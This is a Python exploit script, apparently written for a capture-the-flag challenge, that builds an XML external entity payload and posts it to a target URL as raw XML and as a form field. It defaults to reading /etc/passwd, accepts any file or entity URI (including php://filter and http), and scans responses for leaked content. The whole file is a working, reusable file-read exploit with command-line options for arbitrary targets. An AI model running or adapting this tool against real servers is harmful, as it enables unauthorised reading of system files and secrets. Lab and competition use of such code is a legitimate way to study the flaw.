#!/usr/bin/env python3
"""Send an XXE file-read payload, both as a raw XML body and as a form field.

    python xxe_send.py http://inj4.chal.deti:8043/import --file /flag/flag
    python xxe_send.py http://t/import --file /etc/passwd --field xml --root record --tag title
    python xxe_send.py http://t/api --template my.xml      # your own XML containing &xxe;
"""
import argparse
import html
import re

import requests

FLAG = re.compile(r"flag\{[^}]+\}")


def main():
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("url")
    ap.add_argument("--file", default="/etc/passwd")
    ap.add_argument("--uri", help="full entity URI (overrides --file), e.g. php://filter/... or http://...")
    ap.add_argument("--root", default="record")
    ap.add_argument("--tag", default="title", help="element whose text is reflected")
    ap.add_argument("--field", default="xml", help="form field name for the form-post variant")
    ap.add_argument("--template", help="XML file with &xxe; placeholder and {URI} in DOCTYPE")
    ap.add_argument("-c", "--cookie")
    a = ap.parse_args()
    uri = a.uri or f"file://{a.file}"
    if a.template:
        xml = open(a.template, encoding="utf-8").read().replace("{URI}", uri)
    else:
        xml = (f'<?xml version="1.0"?><!DOCTYPE {a.root} [<!ENTITY xxe SYSTEM "{uri}">]>'
               f"<{a.root}><id>1</id><{a.tag}>&xxe;</{a.tag}></{a.root}>")
    hdr = {"Cookie": a.cookie} if a.cookie else {}
    print(xml)
    for name, kw in [("raw application/xml", {"data": xml.encode(), "headers": {**hdr, "Content-Type": "application/xml"}}),
                     ("raw text/xml", {"data": xml.encode(), "headers": {**hdr, "Content-Type": "text/xml"}}),
                     (f"form field '{a.field}'", {"data": {a.field: xml}, "headers": hdr})]:
        r = requests.post(a.url, timeout=15, **kw)
        body = html.unescape(r.text)
        fl = FLAG.findall(body)
        print(f"\n=== {name}: {r.status_code} {len(r.content)}B {fl[0] if fl else ''}")
        if not fl:
            print(body[:600])


if __name__ == "__main__":
    main()
